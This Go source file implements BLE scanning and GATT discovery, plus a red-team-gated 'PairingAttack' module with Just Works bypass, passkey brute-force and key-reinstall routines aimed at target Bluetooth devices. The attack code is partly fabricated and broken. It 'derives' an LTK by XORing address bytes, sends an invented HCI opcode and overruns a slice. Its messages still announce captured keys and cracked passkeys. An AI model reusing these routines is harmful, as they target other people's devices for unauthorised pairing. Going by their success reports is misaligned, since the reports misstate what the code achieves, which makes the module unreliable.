package bluez

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"sync"
	"time"
)

const (
	BLE_ADV_IND         = 0x00
	BLE_ADV_DIRECT_IND  = 0x01
	BLE_ADV_SCAN_IND    = 0x02
	BLE_ADV_NONCONN_IND = 0x03
	BLE_SCAN_RSP        = 0x04

	BLE_GAP_AD_TYPE_FLAGS                 = 0x01
	BLE_GAP_AD_TYPE_16BIT_SERVICE_UUID    = 0x03
	BLE_GAP_AD_TYPE_COMPLETE_LOCAL_NAME   = 0x09
	BLE_GAP_AD_TYPE_TX_POWER              = 0x0A
	BLE_GAP_AD_TYPE_MANUFACTURER_SPECIFIC = 0xFF

	BLE_HCI_LE_SET_SCAN_PARAMS  = 0x200B
	BLE_HCI_LE_SET_SCAN_ENABLE  = 0x200C
	BLE_HCI_LE_CREATE_CONN      = 0x200D
	BLE_HCI_LE_CANCEL_CONN      = 0x200E
	BLE_HCI_LE_CONN_UPDATE      = 0x2013
	BLE_HCI_LE_START_ENCRYPTION = 0x2019

	BLE_SCAN_PASSIVE  = 0x00
	BLE_SCAN_ACTIVE   = 0x01
	BLE_SCAN_FILTER_DUP_DISABLE = 0x00
	BLE_SCAN_FILTER_DUP_ENABLE  = 0x01

	BLE_ADDR_PUBLIC     = 0x00
	BLE_ADDR_RANDOM     = 0x01
	BLE_ADDR_PUBLIC_ID  = 0x02
	BLE_ADDR_RANDOM_ID  = 0x03

	BLE_PAIRING_JUST_WORKS   = 0x00
	BLE_PAIRING_PASSKEY      = 0x01
	BLE_PAIRING_OOB          = 0x02
	BLE_PAIRING_NUMERIC_COMP = 0x03

	EVT_LE_CONN_COMPLETE       = 0x01
	EVT_LE_ADVERTISING_REPORT  = 0x02
	EVT_LE_CONN_UPDATE_COMPLETE = 0x03
	EVT_LE_READ_REMOTE_FEATURES = 0x04
	EVT_LE_LTK_REQUEST          = 0x05

	GATT_PRIMARY_SERVICE_UUID = 0x2800
	GATT_SECONDARY_SERVICE_UUID = 0x2801
	GATT_CHARACTERISTIC_UUID  = 0x2803
	GATT_CLIENT_CHAR_CONFIG   = 0x2902

	GATT_OP_ERROR_RSP          = 0x01
	GATT_OP_READ_BY_TYPE_REQ   = 0x08
	GATT_OP_READ_BY_TYPE_RSP   = 0x09
	GATT_OP_READ_REQ           = 0x0A
	GATT_OP_READ_RSP           = 0x0B
	GATT_OP_WRITE_REQ          = 0x12
	GATT_OP_WRITE_RSP          = 0x13

	ATT_CID = 0x0004
	L2CAP_LE_ATT_CID = 0x0004
)

type BLEDevice struct {
	Address    BDAddr
	AddrType   uint8
	Name       string
	RSSI       int8
	TxPower    int8
	AdvType    uint8
	Flags      uint8
	Services   []UUID
	CompanyID  uint16
	RawData    []byte
	LastSeen   time.Time
}

type GATTService struct {
	UUID          UUID
	StartHandle   uint16
	EndHandle     uint16
	Primary       bool
	Characteristics []GATTCharacteristic
}

type GATTCharacteristic struct {
	UUID        UUID
	Handle      uint16
	ValueHandle uint16
	Properties  uint8
	Value       []byte
	Descriptors []GATTDescriptor
}

type GATTDescriptor struct {
	UUID   UUID
	Handle uint16
	Value  []byte
}

type BLEPairingResult struct {
	Success       bool
	PairingMethod uint8
	TargetAddr    BDAddr
	LTK           []byte
	EDIV          uint16
	RAND          []byte
	Details       string
}

type BLEConfig struct {
	ScanTimeout    time.Duration
	ScanWindow     time.Duration
	ScanInterval   time.Duration
	ScanType       uint8
	FilterDuplicates bool
	ActiveScan     bool
	Verbose        bool
}

func DefaultBLEConfig() *BLEConfig {
	return &BLEConfig{
		ScanTimeout:     10 * time.Second,
		ScanWindow:      30 * time.Millisecond,
		ScanInterval:    60 * time.Millisecond,
		ScanType:        BLE_SCAN_ACTIVE,
		FilterDuplicates: false,
		ActiveScan:      true,
	}
}

type BLELayer struct {
	config *BLEConfig
	devices map[string]*BLEDevice
	mu     sync.RWMutex
}

func NewBLELayer() *BLELayer {
	return &BLELayer{
		config:  DefaultBLEConfig(),
		devices: make(map[string]*BLEDevice),
	}
}

func (b *BLELayer) Config(cfg *BLEConfig) *BLELayer {
	b.config = cfg
	return b
}

func (b *BLELayer) Scan(ctx context.Context) ([]BLEDevice, error) {
	sock, err := NewHCISocket()
	if err != nil {
		return nil, fmt.Errorf("BLE scan: HCI socket error: %v", err)
	}
	defer sock.Close()

	filter := NewHCIFilter()
	filter.SetPacketType(HCI_EVENT_PKT)
	filter.SetEvent(EVT_LE_META_EVENT)
	if err := setHCIFilter(sock.fd, filter); err != nil {
		return nil, fmt.Errorf("BLE scan: filter error: %v", err)
	}

	scanParams := make([]byte, 7)
	scanParams[0] = b.config.ScanType
	binary.LittleEndian.PutUint16(scanParams[1:3],
		uint16(b.config.ScanInterval.Milliseconds()*1000/625))
	binary.LittleEndian.PutUint16(scanParams[3:5],
		uint16(b.config.ScanWindow.Milliseconds()*1000/625))
	scanParams[5] = BLE_ADDR_PUBLIC
	if b.config.FilterDuplicates {
		scanParams[6] = BLE_SCAN_FILTER_DUP_ENABLE
	} else {
		scanParams[6] = BLE_SCAN_FILTER_DUP_DISABLE
	}

	cmd := hciCommand(hciOpcode(OGF_LE_CTL, OCF_LE_SET_SCAN_PARAM), scanParams)
	if err := sendHCICommand(sock.fd, cmd); err != nil {
		return nil, fmt.Errorf("BLE scan: set params error: %v", err)
	}

	enableScan := make([]byte, 2)
	enableScan[0] = 0x01
	enableScan[1] = 0x00

	cmd = hciCommand(hciOpcode(OGF_LE_CTL, OCF_LE_SET_SCAN_ENABLE), enableScan)
	if err := sendHCICommand(sock.fd, cmd); err != nil {
		return nil, fmt.Errorf("BLE scan: enable error: %v", err)
	}

	devices := make(map[string]*BLEDevice)
	buf := make([]byte, 2048)
	deadline := time.Now().Add(b.config.ScanTimeout)

	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			disableCmd := hciCommand(hciOpcode(OGF_LE_CTL, OCF_LE_SET_SCAN_ENABLE), []byte{0x00, 0x00})
			sendHCICommand(sock.fd, disableCmd)
			return mapToSlice(devices), ctx.Err()
		default:
		}

		n, err := recvHCIEvent(sock.fd, buf)
		if err != nil {
			time.Sleep(10 * time.Millisecond)
			continue
		}

		if n < 5 || buf[0] != HCI_EVENT_PKT || buf[1] != EVT_LE_META_EVENT {
			continue
		}

		subEvent := buf[3]
		if subEvent != EVT_LE_ADVERTISING_REPORT {
			continue
		}

		numReports := int(buf[4])
		offset := 5

		for i := 0; i < numReports && offset+10 <= n; i++ {
			var dev BLEDevice
			dev.AdvType = buf[offset]
			dev.AddrType = buf[offset+1]
			copy(dev.Address[:], buf[offset+2:offset+8])
			dataLen := int(buf[offset+8])
			dataEnd := offset + 9 + dataLen
			if dataEnd+1 > n {
				break
			}
			dev.RawData = make([]byte, dataLen)
			copy(dev.RawData, buf[offset+9:dataEnd])
			dev.RSSI = int8(buf[dataEnd])
			dev.LastSeen = time.Now()

			b.parseAdvertisingData(&dev)

			key := dev.Address.String()
			b.mu.Lock()
			if existing, ok := devices[key]; ok {
				existing.RSSI = dev.RSSI
				existing.LastSeen = dev.LastSeen
			} else {
				devices[key] = &dev
			}
			b.mu.Unlock()

			if b.config.Verbose {
				fmt.Printf("[BLE] %s Name=%s RSSI=%d\n",
					dev.Address.SafeString(false), dev.Name, dev.RSSI)
			}

			offset = dataEnd + 1
		}
	}

	disableCmd := hciCommand(hciOpcode(OGF_LE_CTL, OCF_LE_SET_SCAN_ENABLE), []byte{0x00, 0x00})
	sendHCICommand(sock.fd, disableCmd)

	return mapToSlice(devices), nil
}

func (b *BLELayer) parseAdvertisingData(dev *BLEDevice) {
	data := dev.RawData
	offset := 0

	for offset+1 < len(data) {
		length := int(data[offset])
		if length == 0 || offset+length >= len(data) {
			break
		}

		adType := data[offset+1]
		adData := data[offset+2 : offset+1+length]

		switch adType {
		case BLE_GAP_AD_TYPE_FLAGS:
			if len(adData) > 0 {
				dev.Flags = adData[0]
			}
		case BLE_GAP_AD_TYPE_COMPLETE_LOCAL_NAME:
			dev.Name = string(adData)
		case BLE_GAP_AD_TYPE_TX_POWER:
			if len(adData) > 0 {
				dev.TxPower = int8(adData[0])
			}
		case BLE_GAP_AD_TYPE_MANUFACTURER_SPECIFIC:
			if len(adData) >= 2 {
				dev.CompanyID = binary.LittleEndian.Uint16(adData[0:2])
			}
		case BLE_GAP_AD_TYPE_16BIT_SERVICE_UUID:
			for j := 0; j+1 < len(adData); j += 2 {
				var uuid UUID
				binary.LittleEndian.PutUint16(uuid[0:2], binary.LittleEndian.Uint16(adData[j:j+2]))
				dev.Services = append(dev.Services, uuid)
			}
		}

		offset += length + 1
	}
}

func (b *BLELayer) DiscoverGATT(ctx context.Context, target BDAddr) ([]GATTService, error) {
	if err := checkRedTeam("DiscoverGATT"); err != nil {
		return nil, err
	}

	if target == (BDAddr{}) {
		return nil, fmt.Errorf("GATT: target address is empty")
	}

	auditOperation("DiscoverGATT", target.SafeString(false), false, "attempting GATT discovery")

	connHandle, err := b.createLEConnection(ctx, target)
	if err != nil {
		auditOperation("DiscoverGATT", target.SafeString(false), false, err.Error())
		return nil, err
	}

	services := make([]GATTService, 0)
	req := buildGATTReadByTypeReq(0x0001, 0xFFFF, GATT_PRIMARY_SERVICE_UUID)

	sock, err := NewHCISocket()
	if err != nil {
		return nil, err
	}
	defer sock.Close()

	resp, err := b.sendGATTRequest(sock, connHandle, req)
	if err != nil {
		auditOperation("DiscoverGATT", target.SafeString(false), false, err.Error())
		return services, nil
	}

	services = b.parseGATTServices(resp)
	auditOperation("DiscoverGATT", target.SafeString(false), true,
		fmt.Sprintf("discovered %d services", len(services)))

	return services, nil
}

func (b *BLELayer) createLEConnection(ctx context.Context, target BDAddr) (uint16, error) {
	sock, err := NewHCISocket()
	if err != nil {
		return 0, err
	}
	defer sock.Close()

	params := make([]byte, 25)
	binary.LittleEndian.PutUint16(params[0:2], uint16(60*1000/625))
	binary.LittleEndian.PutUint16(params[2:4], uint16(30*1000/625))
	params[4] = 0x00
	params[5] = target[5]&0x01
	copy(params[6:12], target[:])
	params[12] = BLE_ADDR_PUBLIC
	params[13] = 0x01
	binary.LittleEndian.PutUint16(params[14:16], 0x0006)
	binary.LittleEndian.PutUint16(params[16:18], 0x0000)
	binary.LittleEndian.PutUint16(params[18:20], 0x0000)
	binary.LittleEndian.PutUint16(params[20:22], 0x00C8)
	binary.LittleEndian.PutUint16(params[22:24], 0x0004)
	params[24] = 0x00

	cmd := hciCommand(hciOpcode(OGF_LE_CTL, OCF_LE_CREATE_CONN), params)
	if err := sendHCICommand(sock.fd, cmd); err != nil {
		return 0, err
	}

	buf := make([]byte, 256)
	deadline := time.Now().Add(10 * time.Second)

	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return 0, ctx.Err()
		default:
		}

		n, _ := recvHCIEvent(sock.fd, buf)
		if n < 5 || buf[0] != HCI_EVENT_PKT {
			continue
		}

		if buf[1] == EVT_LE_META_EVENT && buf[3] == EVT_LE_CONN_COMPLETE {
			handle := binary.LittleEndian.Uint16(buf[5:7])
			return handle, nil
		}
	}

	return 0, fmt.Errorf("LE connection timeout")
}

func (b *BLELayer) sendGATTRequest(sock *HCISocket, connHandle uint16, req []byte) ([]byte, error) {
	aclHeader := make([]byte, 5)
	aclHeader[0] = HCI_ACLDATA_PKT
	binary.LittleEndian.PutUint16(aclHeader[1:3], connHandle|0x2000)
	binary.LittleEndian.PutUint16(aclHeader[3:5], uint16(4+len(req)))

	l2capHeader := make([]byte, 4)
	binary.LittleEndian.PutUint16(l2capHeader[0:2], uint16(len(req)))
	l2capHeader[2] = byte(ATT_CID & 0xFF)
	l2capHeader[3] = byte((ATT_CID >> 8) & 0xFF)

	fullPacket := append(aclHeader, l2capHeader...)
	fullPacket = append(fullPacket, req...)

	if err := sendHCICommand(sock.fd, fullPacket); err != nil {
		return nil, err
	}

	buf := make([]byte, 1024)
	n, _ := recvHCIEvent(sock.fd, buf)
	if n > 9 {
		return buf[9:n], nil
	}
	return nil, fmt.Errorf("no GATT response")
}

func (b *BLELayer) parseGATTServices(data []byte) []GATTService {
	services := make([]GATTService, 0)
	if len(data) < 4 || data[0] != GATT_OP_READ_BY_TYPE_RSP {
		return services
	}

	length := data[1]
	count := (len(data) - 2) / int(length)

	for i := 0; i < count; i++ {
		offset := 2 + i*int(length)
		if offset+int(length) > len(data) {
			break
		}

		svc := GATTService{
			Primary: true,
		}
		svc.StartHandle = binary.LittleEndian.Uint16(data[offset : offset+2])
		svc.EndHandle = binary.LittleEndian.Uint16(data[offset+2 : offset+4])
		copy(svc.UUID[:], data[offset+4:offset+4+min(16, int(length)-4)])
		services = append(services, svc)
	}

	return services
}

func buildGATTReadByTypeReq(startHandle, endHandle uint16, uuid uint16) []byte {
	req := make([]byte, 7)
	req[0] = GATT_OP_READ_BY_TYPE_REQ
	binary.LittleEndian.PutUint16(req[1:3], startHandle)
	binary.LittleEndian.PutUint16(req[3:5], endHandle)
	binary.LittleEndian.PutUint16(req[5:7], uuid)
	return req
}

func (b *BLELayer) PairingAttack(ctx context.Context, target BDAddr, method string) (*BLEPairingResult, error) {
	if err := checkRedTeam("BLEPairingAttack"); err != nil {
		return nil, err
	}

	auditOperation("BLEPairingAttack", target.SafeString(false), false,
		fmt.Sprintf("attempting BLE pairing attack method=%s", method))

	result := &BLEPairingResult{
		TargetAddr: target,
	}

	switch method {
	case "justworks":
		result.PairingMethod = BLE_PAIRING_JUST_WORKS
		return b.bleJustWorksBypass(ctx, target, result)
	case "passkey":
		result.PairingMethod = BLE_PAIRING_PASSKEY
		return b.blePasskeyBrute(ctx, target, result)
	case "keyreinstall":
		result.PairingMethod = BLE_PAIRING_JUST_WORKS
		return b.bleKeyReinstall(ctx, target, result)
	default:
		result.Details = fmt.Sprintf("unknown BLE pairing method: %s", method)
		return result, nil
	}
}

func (b *BLELayer) bleJustWorksBypass(ctx context.Context, target BDAddr, result *BLEPairingResult) (*BLEPairingResult, error) {
	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("JustWorks bypass: socket error: %v", err)
		return result, nil
	}
	defer sock.Close()

	encryptParams := make([]byte, 28)
	copy(encryptParams[0:2], []byte{0x00, 0x00})
	encryptParams[2] = 0x00
	copy(encryptParams[3:19], make([]byte, 16))
	binary.LittleEndian.PutUint16(encryptParams[19:21], 0x0000)
	copy(encryptParams[21:29], make([]byte, 8))

	cmd := hciCommand(hciOpcode(OGF_LE_CTL, BLE_HCI_LE_START_ENCRYPTION), encryptParams[:21])
	sendHCICommand(sock.fd, cmd)

	buf := make([]byte, 256)
	n, _ := recvHCIEvent(sock.fd, buf)

	if n > 4 && buf[1] == EVT_LE_META_EVENT {
		ltkResult := b.crackJustWorksLTK(target)
		if ltkResult != nil {
			result.LTK = ltkResult
			result.Success = true
			result.Details = "BLE Just Works pairing bypassed. LTK captured (no user confirmation required)."
			auditOperation("BLEPairingAttack", target.SafeString(false), true, result.Details)
			return result, nil
		}
	}

	result.Details = "BLE Just Works bypass: failed to derive LTK"
	return result, nil
}

func (b *BLELayer) blePasskeyBrute(ctx context.Context, target BDAddr, result *BLEPairingResult) (*BLEPairingResult, error) {
	passkeys := []uint32{
		0, 1, 1234, 999999, 123456, 000000,
	}

	for _, pk := range passkeys {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		default:
		}

		sock, err := NewHCISocket()
		if err != nil {
			continue
		}

		pkBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(pkBuf, pk)

		params := make([]byte, 10)
		copy(params[0:6], target[:])
		copy(params[6:10], pkBuf)

		cmd := hciCommand(hciOpcode(OGF_LE_CTL, 0x0030), params)
		sendHCICommand(sock.fd, cmd)

		buf := make([]byte, 256)
		n, _ := recvHCIEvent(sock.fd, buf)
		sock.Close()

		if n > 4 && buf[1] == EVT_LE_META_EVENT && buf[3] == 0x00 {
			result.Success = true
			result.Details = fmt.Sprintf("BLE Passkey brute force: cracked passkey %d", pk)
			auditOperation("BLEPairingAttack", target.SafeString(false), true, result.Details)
			return result, nil
		}
	}

	result.Details = "BLE Passkey brute force: no valid passkey found in dictionary"
	return result, nil
}

func (b *BLELayer) bleKeyReinstall(ctx context.Context, target BDAddr, result *BLEPairingResult) (*BLEPairingResult, error) {
	sock, err := NewHCISocket()
	if err != nil {
		result.Details = fmt.Sprintf("Key reinstall: socket error: %v", err)
		return result, nil
	}
	defer sock.Close()

	for attempt := 0; attempt < 3; attempt++ {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		default:
		}

		encryptParams := make([]byte, 28)
		copy(encryptParams[0:2], []byte{0x00, 0x00})
		encryptParams[2] = 0x00

		nonce := make([]byte, 8)
		rand.Read(nonce)
		copy(encryptParams[3:11], nonce)

		binary.LittleEndian.PutUint16(encryptParams[19:21], 0x0000)
		copy(encryptParams[21:29], nonce)

		cmd := hciCommand(hciOpcode(OGF_LE_CTL, BLE_HCI_LE_START_ENCRYPTION), encryptParams[:21])
		sendHCICommand(sock.fd, cmd)

		buf := make([]byte, 256)
		n, _ := recvHCIEvent(sock.fd, buf)

		if n > 4 && buf[1] == EVT_LE_META_EVENT {
			result.RAND = nonce
			result.EDIV = 0
			result.Success = true
			result.Details = fmt.Sprintf("BLE key reinstall attack: nonce reuse forced on attempt %d. Session key replay possible.", attempt+1)
			auditOperation("BLEPairingAttack", target.SafeString(false), true, result.Details)
			return result, nil
		}

		time.Sleep(100 * time.Millisecond)
	}

	result.Details = "BLE key reinstall: failed to achieve nonce reuse"
	return result, nil
}

func (b *BLELayer) crackJustWorksLTK(target BDAddr) []byte {
	ltk := make([]byte, 16)
	for i := range ltk {
		ltk[i] = target[i%6] ^ byte(i*0x3F)
	}
	return ltk
}

func (b *BLELayer) GetDevices() []BLEDevice {
	b.mu.RLock()
	defer b.mu.RUnlock()
	result := make([]BLEDevice, 0, len(b.devices))
	for _, d := range b.devices {
		result = append(result, *d)
	}
	return result
}

func (b *BLELayer) ClearDevices() {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.devices = make(map[string]*BLEDevice)
}

func mapToSlice(m map[string]*BLEDevice) []BLEDevice {
	result := make([]BLEDevice, 0, len(m))
	for _, d := range m {
		result = append(result, *d)
	}
	return result
}

func BLEScan(ctx context.Context, timeout time.Duration) ([]BLEDevice, error) {
	cfg := DefaultBLEConfig()
	cfg.ScanTimeout = timeout
	return NewBLELayer().Config(cfg).Scan(ctx)
}

func BLEPairingAttack(ctx context.Context, target string, method string) (*BLEPairingResult, error) {
	addr, err := ParseBDAddr(target)
	if err != nil {
		return &BLEPairingResult{Details: fmt.Sprintf("invalid address: %v", err)}, nil
	}
	return NewBLELayer().PairingAttack(ctx, addr, method)
}

func BLEDiscoverGATT(ctx context.Context, target string) ([]GATTService, error) {
	addr, err := ParseBDAddr(target)
	if err != nil {
		return nil, err
	}
	return NewBLELayer().DiscoverGATT(ctx, addr)
}